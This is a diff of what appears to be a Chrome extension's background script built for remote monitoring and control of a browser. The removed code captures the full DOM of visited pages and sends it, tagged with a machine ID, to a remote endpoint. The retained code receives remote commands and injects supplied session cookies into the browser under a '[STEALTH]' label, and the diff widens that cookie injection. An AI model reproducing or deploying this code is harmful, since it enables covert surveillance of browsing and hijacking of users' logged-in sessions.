@@ -180,9 +180,6 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     log('debug', `🔍 Tab updated - ID: ${tabId}, URL: ${tab.url}`);
     collectPageData(tab);
     trackSession(tab);
-    
-    // 📸 Shadow Navigation: Capture DOM snapshot for real-time viewing
-    captureAndStreamDOM(tabId, tab);
   } else if (changeInfo.status === 'complete' && !monitoringEnabled) {
     log('debug', `⏸️ Tab updated but monitoring is disabled - ID: ${tabId}`);
   }
@@ -895,14 +892,6 @@ async function handleRemoteCommand(data) {
         await handleProxyFetchCommand(data);
         break;
       
-      case 'capture_dom':
-        log('info', '📸 Capture DOM command received:', {
-          command_id: data.command_id,
-          target_tab_id: data.target_tab_id
-        });
-        await handleCaptureDOMCommand(data);
-        break;
-      
       default:
         log('warn', 'Unknown command type:', data.command_type);
         throw new Error(`Unknown command type: ${data.command_type}`);
@@ -941,91 +930,6 @@ async function updateCommandStatus(command_id, status, error_message) {
     }
   } catch (error) {
     log('debug', 'Error updating command status:', error.message);
-  }
-}
-
-// 📸 Capture and stream DOM snapshot for Shadow Navigation
-let lastCaptureTime = new Map(); // Track last capture per tab
-const CAPTURE_DEBOUNCE = 2000; // 2 seconds
-
-async function captureAndStreamDOM(tabId, tab) {
-  try {
-    // Debounce: Skip if captured recently
-    const now = Date.now();
-    const lastCapture = lastCaptureTime.get(tabId) || 0;
-    if (now - lastCapture < CAPTURE_DEBOUNCE) {
-      return;
-    }
-    lastCaptureTime.set(tabId, now);
-    
-    // Skip chrome:// and extension pages
-    if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
-      return;
-    }
-    
-    log('debug', `📸 Capturing DOM for tab ${tabId}: ${tab.url}`);
-    
-    const [result] = await chrome.scripting.executeScript({
-      target: { tabId },
-      func: () => {
-        return {
-          html: document.documentElement.outerHTML,
-          url: window.location.href,
-          title: document.title,
-          baseUrl: document.baseURI,
-          resources: performance.getEntriesByType('resource')
-            .filter(r => r.initiatorType !== 'xmlhttprequest' && r.transferSize < 100000)
-            .map(r => ({ 
-              name: r.name, 
-              type: r.initiatorType, 
-              size: r.transferSize 
-            })),
-          viewport: { 
-            width: window.innerWidth, 
-            height: window.innerHeight 
-          },
-          timestamp: Date.now()
-        };
-      }
-    });
-    
-    if (!result || !result.result) {
-      log('warn', 'Failed to capture DOM snapshot');
-      return;
-    }
-    
-    // Send snapshot to Supabase edge function
-    await fetch(`${CONFIG.API_BASE}/dom-snapshot`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
-      },
-      body: JSON.stringify({
-        machine_id: machineId,
-        tab_id: tabId.toString(),
-        snapshot: result.result
-      })
-    });
-    
-    log('debug', `✅ DOM snapshot sent for ${tab.url}`);
-  } catch (error) {
-    log('debug', 'DOM capture failed (non-critical):', error.message);
-  }
-}
-
-// Handle capture_dom command
-async function handleCaptureDOMCommand(data) {
-  const targetTabId = parseInt(data.target_tab_id);
-  
-  try {
-    const tab = await chrome.tabs.get(targetTabId);
-    await captureAndStreamDOM(targetTabId, tab);
-    
-    log('info', `✅ DOM captured on-demand for tab ${targetTabId}`);
-  } catch (error) {
-    log('error', `Failed to capture DOM for tab ${targetTabId}:`, error);
-    throw error;
   }
 }
 
@@ -1281,39 +1185,7 @@ async function handleProxyFetchCommand(data) {
     if (providedCookies && Array.isArray(providedCookies) && providedCookies.length > 0) {
       log('info', `🍪 [STEALTH] Injecting ${providedCookies.length} cookies...`);
       
-      // ✅ CORREÇÃO #4: Filtrar cookies inválidos antes de injetar
-      const validCookies = providedCookies.filter(cookie => {
-        // Remover HttpOnly (não pode ser setado via JS na extensão)
-        if (cookie.httpOnly === true) {
-          log('debug', `[CookieFilter] Skipped HttpOnly: ${cookie.name}`);
-          return false;
-        }
-        
-        // Remover cookies sem domínio válido
-        if (!cookie.domain || cookie.domain === '') {
-          log('debug', `[CookieFilter] Skipped invalid domain: ${cookie.name}`);
-          return false;
-        }
-        
-        // Remover cookies XSRF/CSRF (gerados dinamicamente pelo servidor)
-        const name = cookie.name.toLowerCase();
-        if (name.includes('xsrf') || name.includes('csrf')) {
-          log('debug', `[CookieFilter] Skipped CSRF token: ${cookie.name}`);
-          return false;
-        }
-        
-        // Remover cookies sem valor
-        if (!cookie.value || cookie.value === 'undefined' || cookie.value === 'null') {
-          log('debug', `[CookieFilter] Skipped empty value: ${cookie.name}`);
-          return false;
-        }
-        
-        return true;
-      });
-      
-      log('info', `[CookieFilter] Filtered ${providedCookies.length} → ${validCookies.length} valid cookies`);
-      
-      for (const cookie of validCookies) {
+      for (const cookie of providedCookies) {
         try {
           const cookieDetails = {
             url: target_url,
@@ -1322,14 +1194,9 @@ async function handleProxyFetchCommand(data) {
             domain: cookie.domain || targetDomain,
             path: cookie.path || '/',
             secure: cookie.secure !== false,
-            httpOnly: false, // Force false since we filtered HttpOnly
+            httpOnly: cookie.httpOnly || false,
             sameSite: cookie.sameSite || 'lax'
           };
-          
-          // Add expiration if not session cookie
-          if (!cookie.isSession && cookie.expirationDate) {
-            cookieDetails.expirationDate = cookie.expirationDate;
-          }
           
           await chrome.cookies.set(cookieDetails);
           injectedCookies.push({ name: cookie.name, domain: cookieDetails.domain });
